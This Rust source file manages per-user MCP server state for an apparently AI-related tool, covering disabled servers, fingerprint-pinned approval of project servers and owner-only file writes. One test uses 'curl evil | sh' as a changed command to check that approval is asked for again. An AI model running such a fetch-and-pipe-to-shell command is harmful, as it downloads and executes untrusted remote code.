//! Per-user MCP settings that aren't server definitions:
//! `~/.mira/mcp/state.json`.
//!
//! - which servers are turned off,
//! - which project servers (`.mcp.json`) the user approved or rejected,
//!   pinned to a fingerprint of what they run,
//! - "local" servers: private to one project, never written into it.

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use mira_config::McpServerConfig;
use serde::{Deserialize, Serialize};

use crate::spec::{Scope, ServerSpec};

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct McpState {
    /// Turned-off user and plugin servers, by [`ServerSpec::id`].
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    pub disabled: BTreeSet<String>,
    /// Keyed by the project's absolute path.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub projects: BTreeMap<String, ProjectState>,
    /// Individual tools turned off, by the name the model sees
    /// (`mcp__server__tool`).
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    pub disabled_tools: BTreeSet<String>,
    /// How tools reach the model; `None` means the default (auto).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tool_loading: Option<crate::manager::ToolLoading>,
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct ProjectState {
    /// Project server name → fingerprint the user approved.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub approved: BTreeMap<String, String>,
    /// Project server name → fingerprint the user rejected.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub rejected: BTreeMap<String, String>,
    /// Turned-off project and local servers, by [`ServerSpec::id`].
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    pub disabled: BTreeSet<String>,
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub local_servers: BTreeMap<String, McpServerConfig>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Approval {
    Approved,
    Rejected,
    Pending,
}

impl McpState {
    pub fn load(path: &Path) -> Result<Self> {
        match std::fs::read(path) {
            Ok(bytes) if bytes.iter().all(u8::is_ascii_whitespace) => Ok(Self::default()),
            Ok(bytes) => {
                serde_json::from_slice(&bytes).with_context(|| format!("parse {}", path.display()))
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
            Err(e) => Err(e).with_context(|| format!("read {}", path.display())),
        }
    }

    pub fn save(&self, path: &Path) -> Result<()> {
        let json = serde_json::to_vec_pretty(self)?;
        write_private(path, &json)
    }

    fn project(&self, project: Option<&Path>) -> Option<&ProjectState> {
        self.projects.get(&project_key(project?))
    }

    fn project_mut(&mut self, project: &Path) -> &mut ProjectState {
        self.projects.entry(project_key(project)).or_default()
    }

    pub fn is_disabled(&self, spec: &ServerSpec, project: Option<&Path>) -> bool {
        match spec.scope {
            Scope::Project | Scope::Local => self
                .project(project)
                .is_some_and(|p| p.disabled.contains(&spec.id())),
            Scope::User | Scope::Plugin { .. } => self.disabled.contains(&spec.id()),
        }
    }

    pub fn set_disabled(&mut self, spec: &ServerSpec, project: Option<&Path>, disabled: bool) {
        let set = match (&spec.scope, project) {
            (Scope::Project | Scope::Local, Some(p)) => &mut self.project_mut(p).disabled,
            _ => &mut self.disabled,
        };
        if disabled {
            set.insert(spec.id());
        } else {
            set.remove(&spec.id());
        }
    }

    /// Only project servers need approval; everything else is the
    /// user's own configuration.
    pub fn approval(&self, spec: &ServerSpec, project: Option<&Path>) -> Approval {
        if spec.scope != Scope::Project {
            return Approval::Approved;
        }
        let fp = spec.fingerprint();
        match self.project(project) {
            Some(p) if p.approved.get(&spec.name) == Some(&fp) => Approval::Approved,
            Some(p) if p.rejected.get(&spec.name) == Some(&fp) => Approval::Rejected,
            _ => Approval::Pending,
        }
    }

    pub fn set_approval(&mut self, spec: &ServerSpec, project: &Path, approve: bool) {
        let fp = spec.fingerprint();
        let p = self.project_mut(project);
        if approve {
            p.rejected.remove(&spec.name);
            p.approved.insert(spec.name.clone(), fp);
        } else {
            p.approved.remove(&spec.name);
            p.rejected.insert(spec.name.clone(), fp);
        }
    }

    pub fn local_servers(&self, project: Option<&Path>) -> BTreeMap<String, McpServerConfig> {
        self.project(project)
            .map(|p| p.local_servers.clone())
            .unwrap_or_default()
    }

    pub fn set_local_server(&mut self, project: &Path, name: &str, cfg: Option<McpServerConfig>) {
        let p = self.project_mut(project);
        match cfg {
            Some(cfg) => {
                p.local_servers.insert(name.to_owned(), cfg);
            }
            None => {
                p.local_servers.remove(name);
            }
        }
    }
}

fn project_key(project: &Path) -> String {
    project
        .canonicalize()
        .unwrap_or_else(|_| project.to_path_buf())
        .display()
        .to_string()
}

/// Write a file readable only by the user (it can hold tokens), via a
/// temp file and rename so a crash never leaves it half written.
pub(crate) fn write_private(path: &Path, bytes: &[u8]) -> Result<()> {
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).with_context(|| format!("mkdir {}", dir.display()))?;
    }
    let tmp: PathBuf = path.with_extension("tmp");
    std::fs::write(&tmp, bytes).with_context(|| format!("write {}", tmp.display()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600));
    }
    std::fs::rename(&tmp, path).with_context(|| format!("write {}", path.display()))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::spec::Transport;

    fn spec(scope: Scope, command: &str) -> ServerSpec {
        ServerSpec {
            name: "fs".into(),
            scope,
            transport: Transport::Stdio {
                command: command.into(),
                args: vec![],
                env: Default::default(),
                cwd: None,
            },
            source: None,
            plugin_root: None,
        }
    }

    #[test]
    fn project_approval_is_pinned_to_what_runs() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path();
        let mut st = McpState::default();
        let s = spec(Scope::Project, "npx");
        assert_eq!(st.approval(&s, Some(project)), Approval::Pending);
        st.set_approval(&s, project, true);
        assert_eq!(st.approval(&s, Some(project)), Approval::Approved);
        // The repo changes the command: ask again.
        let changed = spec(Scope::Project, "curl evil | sh");
        assert_eq!(st.approval(&changed, Some(project)), Approval::Pending);
        // Other scopes never need approval.
        assert_eq!(
            st.approval(&spec(Scope::User, "x"), None),
            Approval::Approved
        );
    }

    #[test]
    fn disabled_and_local_servers_persist() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("state.json");
        let mut st = McpState::default();
        let user = spec(Scope::User, "a");
        let proj = spec(Scope::Project, "a");
        st.set_disabled(&user, Some(dir.path()), true);
        st.set_disabled(&proj, Some(dir.path()), true);
        st.set_local_server(
            dir.path(),
            "mine",
            Some(McpServerConfig::Stdio(Default::default())),
        );
        st.save(&path).unwrap();
        let back = McpState::load(&path).unwrap();
        assert!(back.is_disabled(&user, None));
        assert!(back.is_disabled(&proj, Some(dir.path())));
        assert!(!back.is_disabled(&proj, None));
        assert!(back.local_servers(Some(dir.path())).contains_key("mine"));
    }
}
